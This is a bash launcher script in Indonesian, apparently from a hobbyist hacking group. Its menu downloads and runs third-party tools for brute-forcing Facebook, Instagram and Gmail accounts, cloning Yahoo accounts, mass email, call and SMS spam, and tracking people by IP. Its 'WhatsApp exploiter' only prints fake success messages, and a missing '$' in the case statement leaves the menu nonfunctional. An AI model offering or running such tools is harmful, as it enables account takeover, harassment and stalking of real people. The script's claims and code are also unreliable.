
#!/bin/bash
clear
python2 pw.py
figlet JancokTools | lolcat
read -p "Nama mu:" haha;
echo "Oke $haha Terima kasih" 
sleep 2
clear
figlet JancokTools | lolcat
echo "################################" | lolcat
echo "Author : R4D3N G0Z4LL" | lolcat
echo "TEAM : ICT - C45 - ISL - BHCT " | lolcat
echo "www.radencoding.cf" | lolcat
echo "Fb : Raden Gozal" | lolcat
echo "###############################" | lolcat

echo -e "-----------------------"
echo -e "1. Hack Fb Target" | lolcat
echo -e "-----------------------"
echo -e "2. Hack Fb masal" | lolcat
echo -e "-----------------------"
echo -e "3. Hack Ig target" | lolcat
echo -e "-----------------------"
echo -e "4. Hack Gmail target" | lolcat
echo -e "-----------------------" 
echo -e "5. WHATSAPP EXPLOITER" | lolcat
echo -e "-----------------------" 
echo -e "6. PP GUARD FB" | lolcat
echo -e "-----------------------"
echo -e "7. AUTO LIKE FB" | lolcat
echo -e "-----------------------"
echo -e "8. YAHOO CLONING" | lolcat
echo -e "-----------------------"
echo -e "9. SPAM EMAIL" | lolcat
echo -e "-----------------------"
echo -e "10. SPAM CALL MASS / PERSON" |lolcat
echo -e "-----------------------"
echo -e "11. SPAM SMS MASS / PERSON" | lolcat
echo -e "-----------------------"
echo -e "12. LACAK ORANG PAKE IP" | lolcat
echo -e "-----------------------"
echo -e "13. INSTALL BAHAN DULU DISINI !!!! BIAR GAK ERROR" | lolcat
echo -e "-----------------------"
echo -e "14. exit"
echo -e "╭─[PILIH NOMORNYA]"
read -p "╰─root@R4D3Ng0z4l=" pil;

case pil in
	1) 	clear 
	   	figlet JancokTools | lolcat
		echo "Masukin id terus tulis aja password.txt"
		git clone https://github.com/Senitopeng/fbbrute
		cd fbbrute
		python2 jomblo.py

		;;

	2) clear 
	   figlet JancokTools | lolcat
	   echo "Pilih nomer 1 terus masukin akun kalian"
	   git clone https://github.com/pirmansx/mbf
	   cd mbf 
	   python2 mbf.py

	   ;;

	3) clear 
	   figlet JancokTools | lolcat
	   echo "Example: python instabrute.py username passwords.txt"
	   git clone https://github.com/avramit/Instahack
	   cd Instahack
	   python instabrute.py

	   ;;

	4) clear 
	   figlet JancokTools | lolcat
	   echo "Tinggal pilih nomer 1 terus masukin target"
	   git clone https://github.com/Ha3MrX/Gemail-Hack
	   cd Gemail-Hack
	   chmod +x gemailhack.py
	   python gemailhack.py

	   ;;

	5) clear 
	   figlet JancokTools | lolcat
	   read -p "Masukan nomer anda :" nom;
	   read -p "Masukan nomer target anda :" get;
	   echo "pastikan wa $get tidak mod wa dan sedang off"
	   echo "Exploiting $nom with $get" | lolcat
	   sleep 100
	   echo "Done !!! Silakan Logout wa $nom" | lolcat
	   sleep 100
	   echo "Kode verifikasi $get ada di pesan anda" | lolcat

	   ;;

	6) clear 
	   figlet JancokTools | lolcat
	   echo "Masukan token fb kalian"
	   git clone https://github.com/jaxBCD/FBshield
	   cd FBshield
	   python Guard.py -h

	   ;;

	7) clear 
	   figlet JancokTools | lolcat
	   echo "Masukan token fb kalian"
	   git clone https://github.com/Senitopeng/BotlikeFb
	   cd BotlikeFb
	   php botlike.php

	   ;;

	8) clear 
	   figlet JancokTools | lolcat
	   echo "Masukan akun kalian lalu dapatkan target vuln"
	   git clone https://github.com/wahyuandhika/YahooCloning
	   cd YahooCloning
	   python2 cloning.py

	   ;;

	9) clear 
	   figlet JancokTools | lolcat
	   echo "TINGGAL MASUKIN EMAIL TARGET"
	   git clone https://github.com/revan-ar/mail-spammer
	   cd mail-spammer
	   php mail.php

	   ;;

	10) clear 
	   figlet JancokTools | lolcat
	   echo "KALO MASAL BUAT DULU FILE YG ISINYA NOMER"
	   git clone https://github.com/Senitopeng/CallG
	   cd CallG
	   python2 CallG.py

	   ;;

	11) clear 
	   figlet JancokTools | lolcat
	   echo "KALO MASAL BUAT DULU FILE YG ISINYA NOMER"
	   git clone https://github.com/ICT/Spamsms
	   cd Spamsms
	   php kirim.php

	   ;;

	12) clear 
	   figlet JancokTools | lolcat 
	   git clone https://github.com/indosecid/gps_tracking 
	   cd gps_tracking
	   php gps.php

	   ;;

	13) clear 
	   figlet JancokTools | lolcat 
	   pkg install git
	   pkg install python2
	   pkg install python
	   pkg install php
	   pip2 install lolcat
	   pip2 install mechanize
	   pip2 instal requests
	   pkg instal lolcat
	   pip2 install lolcat
	   echo "DONE BAHANNYA SEMOGA GAK ERROR >///<" | lolcat

	   ;;

	14) clear 
	   figlet JancokTools | lolcat 
	   echo "R4D3N G0Z4LL" | lolcat
	   echo "ICT - C45 - ISL - BHCT" | lolcat
	   echo "Jangan lupa cek channel yt > bocah rpl <" | lolcat
	   figlet see you | lolcat
	   exit

	   ;;

	   *) echo "Pilih yang bener"
			sh jancok.sh
			























